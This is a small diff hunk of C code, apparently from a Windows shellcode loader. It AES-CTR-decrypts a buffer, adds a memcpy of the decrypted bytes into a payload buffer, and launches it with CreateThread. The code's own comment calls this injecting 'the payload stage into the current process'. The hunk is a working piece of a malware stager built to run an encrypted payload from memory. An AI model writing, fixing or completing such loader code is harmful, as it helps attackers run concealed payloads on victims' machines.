@@ -635,6 +635,8 @@ int main(int argc, char* argv[])
 	AES_init_ctx_iv(&ctx, (uint8_t *) key, (uint8_t *) iv);
 	AES_CTR_xcrypt_buffer(&ctx, (uint8_t *) ct, ct_size);
 
+	memcpy(payload, ct, ct_size);
+
 	/* inject the payload stage into the current process */
 	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);
 
